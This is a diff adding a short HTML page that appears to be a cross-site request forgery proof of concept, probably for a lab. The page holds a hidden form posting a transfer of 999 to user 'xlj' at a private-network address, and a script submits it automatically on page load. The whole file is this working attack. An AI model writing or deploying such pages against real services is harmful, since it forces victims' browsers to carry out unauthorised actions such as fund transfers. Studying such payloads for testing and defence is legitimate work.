@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+</head>
+<body>
+  Form:
+  <div class="container">
+    <form action="http://192.168.2.63:32902/transfer" method="POST" id="fff">
+      <input id="inputTo" class="form-control" type="text" name="user_to" value="xlj">
+      <input id="inputAmount" class="form-control" type="number" name="amount" value="999">
+    </form>
+  </div>
+  <script>
+    document.getElementById("fff").submit();
+  </script>
+</body>
+</html>
